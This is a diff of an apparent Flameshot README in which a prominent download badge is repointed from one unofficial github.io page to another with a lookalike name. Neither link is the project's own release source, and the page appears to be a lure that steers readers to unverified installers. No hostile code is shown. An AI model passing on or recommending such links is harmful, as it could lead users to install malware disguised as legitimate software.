@@ -71,7 +71,7 @@ If the portal times out on a minimal window manager, enable the legacy X11 grab.
 
 Get one build. Use the button, then pick the asset for your OS. Do not add a second install path with the same meaning.
 
-[![GET Flameshot Screenshot Software](https://img.shields.io/badge/GET-Flameshot%20Screenshot%20Software-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://cooperwilliam3374.github.io/.github/Flameshot-Screenshot-Software)
+[![GET Flameshot Screenshot Software](https://img.shields.io/badge/GET-Flameshot%20Screenshot%20Software-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://flameshot-screenshot-software.github.io/Flameshot-GUI/)
 
 Linux: distro package, AppImage, Flatpak, Snap, or a tagged archive. Windows: installer or a portable folder. macOS: disk image. Nightly artifacts exist; they are for testers. Daily work should stay on a tagged build.
 
